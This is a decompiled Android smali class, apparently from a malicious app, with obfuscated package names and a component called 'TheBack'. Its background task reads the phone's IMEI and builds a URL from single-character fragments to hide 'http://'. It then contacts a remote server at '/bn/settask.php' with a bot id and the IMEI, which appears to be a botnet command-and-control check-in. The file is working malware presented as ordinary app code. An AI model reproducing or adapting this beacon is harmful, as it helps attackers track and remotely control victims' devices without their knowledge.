.class Lcom/tujtr/rtbrr/c;
.super Landroid/os/AsyncTask;


# instance fields
.field final synthetic a:Lcom/tujtr/rtbrr/TheBack;


# direct methods
.method constructor <init>(Lcom/tujtr/rtbrr/TheBack;Lcom/tujtr/rtbrr/TheBack;)V
    .locals 0

    iput-object p1, p0, Lcom/tujtr/rtbrr/c;->a:Lcom/tujtr/rtbrr/TheBack;

    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    return-void
.end method


# virtual methods
.method public a(Ljava/io/InputStream;)Ljava/io/BufferedReader;
    .locals 3

    new-instance v0, Ljava/io/BufferedReader;

    new-instance v1, Ljava/io/InputStreamReader;

    const-string v2, "utf-8"

    invoke-direct {v1, p1, v2}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;Ljava/lang/String;)V

    const/16 v2, 0x8

    invoke-direct {v0, v1, v2}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;I)V

    return-object v0
.end method

.method public a(Lorg/apache/http/impl/client/DefaultHttpClient;Ljava/lang/String;)Ljava/io/InputStream;
    .locals 1

    invoke-virtual {p0, p2}, Lcom/tujtr/rtbrr/c;->a(Ljava/lang/String;)Lorg/apache/http/client/methods/HttpGet;

    move-result-object v0

    invoke-virtual {p0, v0, p1}, Lcom/tujtr/rtbrr/c;->a(Lorg/apache/http/client/methods/HttpGet;Lorg/apache/http/impl/client/DefaultHttpClient;)Lorg/apache/http/HttpEntity;

    move-result-object v0

    invoke-interface {v0}, Lorg/apache/http/HttpEntity;->getContent()Ljava/io/InputStream;

    move-result-object v0

    return-object v0
.end method

.method public a(Landroid/telephony/TelephonyManager;)Ljava/lang/String;
    .locals 1

    const-string v0, ""

    invoke-virtual {p1}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public a(Ljava/io/BufferedReader;)Ljava/lang/String;
    .locals 1

    invoke-virtual {p1}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method protected a([Ljava/lang/String;)Ljava/lang/String;
    .locals 8

    :try_start_0
    iget-object v0, p0, Lcom/tujtr/rtbrr/c;->a:Lcom/tujtr/rtbrr/TheBack;

    iget-object v0, v0, Lcom/tujtr/rtbrr/TheBack;->a:Landroid/content/Context;

    const-string v1, "phone"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    new-instance v1, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v1}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :try_start_1
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "id="

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/4 v3, 0x0

    aget-object v3, p1, v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x5

    new-array v3, v3, [Ljava/lang/String;

    const/4 v4, 0x0

    const-string v5, "h"

    aput-object v5, v3, v4

    const/4 v4, 0x1

    const-string v5, "t"

    aput-object v5, v3, v4

    const/4 v4, 0x2

    const-string v5, "p"

    aput-object v5, v3, v4

    const/4 v4, 0x3

    const-string v5, ":"

    aput-object v5, v3, v4

    const/4 v4, 0x4

    const-string v5, "/"

    aput-object v5, v3, v4

    sget-object v4, La/a;->a:Ljava/lang/String;

    const-string v5, ""

    const-string v5, "/bn/settask.php?"

    new-instance v6, Ljava/lang/StringBuilder;

    const/4 v7, 0x0

    aget-object v7, v3, v7

    invoke-static {v7}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v7

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/4 v7, 0x1

    aget-object v7, v3, v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const/4 v7, 0x1

    aget-object v7, v3, v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const/4 v7, 0x2

    aget-object v7, v3, v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const/4 v7, 0x3

    aget-object v7, v3, v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const/4 v7, 0x4

    aget-object v7, v3, v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const/4 v7, 0x4

    aget-object v3, v3, v7

    invoke-virtual {v6, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&imei="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {p0, v0}, Lcom/tujtr/rtbrr/c;->a(Landroid/telephony/TelephonyManager;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcom/tujtr/rtbrr/c;->b(Ljava/lang/String;)V

    invoke-virtual {p0, v1, v0}, Lcom/tujtr/rtbrr/c;->a(Lorg/apache/http/impl/client/DefaultHttpClient;Ljava/lang/String;)Ljava/io/InputStream;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcom/tujtr/rtbrr/c;->a(Ljava/io/InputStream;)Ljava/io/BufferedReader;

    move-result-object v1

    invoke-virtual {p0, v1}, Lcom/tujtr/rtbrr/c;->a(Ljava/io/BufferedReader;)Ljava/lang/String;

    invoke-virtual {p0, v1, v0}, Lcom/tujtr/rtbrr/c;->a(Ljava/io/BufferedReader;Ljava/io/InputStream;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :goto_0
    const/4 v0, 0x0

    return-object v0

    :goto_1
    :try_start_2
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_1

    :catch_0
    move-exception v0

    goto :goto_0

    :catch_1
    move-exception v0

    goto :goto_1
.end method

.method public a(Lorg/apache/http/client/methods/HttpGet;Lorg/apache/http/impl/client/DefaultHttpClient;)Lorg/apache/http/HttpEntity;
    .locals 1

    invoke-virtual {p2, p1}, Lorg/apache/http/impl/client/DefaultHttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;

    move-result-object v0

    invoke-interface {v0}, Lorg/apache/http/HttpResponse;->getEntity()Lorg/apache/http/HttpEntity;

    move-result-object v0

    return-object v0
.end method

.method public a(Ljava/lang/String;)Lorg/apache/http/client/methods/HttpGet;
    .locals 1

    new-instance v0, Lorg/apache/http/client/methods/HttpGet;

    invoke-direct {v0, p1}, Lorg/apache/http/client/methods/HttpGet;-><init>(Ljava/lang/String;)V

    return-object v0
.end method

.method public a(Ljava/io/BufferedReader;Ljava/io/InputStream;)V
    .locals 0

    invoke-virtual {p1}, Ljava/io/BufferedReader;->close()V

    invoke-virtual {p2}, Ljava/io/InputStream;->close()V

    return-void
.end method

.method public b(Ljava/lang/String;)V
    .locals 1

    const-string v0, "D"

    invoke-static {v0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method protected synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 1

    check-cast p1, [Ljava/lang/String;

    invoke-virtual {p0, p1}, Lcom/tujtr/rtbrr/c;->a([Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method
